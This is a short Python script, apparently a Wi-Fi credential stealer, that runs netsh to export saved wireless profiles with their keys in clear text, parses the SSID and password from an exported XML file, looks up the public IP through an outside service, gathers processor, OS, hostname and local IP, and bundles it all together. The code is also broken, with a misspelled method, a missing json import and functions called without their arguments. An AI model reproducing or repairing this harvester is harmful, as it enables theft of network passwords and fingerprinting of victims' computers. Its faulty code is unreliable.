import platform as pf
import socket
import subprocess as sp
from time import sleep
from xml.dom import minidom

import requests

sp.call( 'netsh wlan show profile' )
sp.call('netsh wlan export profile folder=user:\\ key=clear')

sleep(2)

def wifi_parse():
    doc = minidom.parse('C:\\Безпровідна сітка-Redmi Note10.xml')

    wifi_name = doc.getElementyByTagName('name')
    wifi_password = doc.getElementsByTagName('keyMaterial')

    global data
    data = f'Wi-FI name : { wifi_name}\nWi-Fi password : {wifi_password}'

def get_ip():
    response = requests.get('http://myip.dnsomatic.com')

    ip = response.text

    global data_ip
    data_ip = f'IP ADDRESS : {ip}'

def info_pc():
    processor = pf.processor()
    name_sys = pf.system() + '' + pf.release()
    net_pc = pf.node()
    ip_pc = socket.gethostbyname(socket.gethostname())

    global data_pc
    data_pc = f'''
    Процесор : { processor }\n
    Система : { name_sys }\n
    Системне ім'я ПК : { net_pc }\n
    IP ADDRESS ПК : { ip_pc }\n
    '''

def all_info():
    global data_all_info
    data_all_info = f'{ data }\n{ data_ip }\n{ data_pc }'


def get_file_data(str, file_name):
    file = open("database/" + file_name, 'r')
    data = json.loads(file.read())
    file.close()
    return data


def save_to_file(self, data):
    data = json.dumps(data)
    file = open('database/' + self.file, "w")
    file.write(data)
    file.close()

def main():
    wifi_parse()
    get_ip()
    info_pc()
    all_info()
    get_file_data()
    save_to_file()

main()
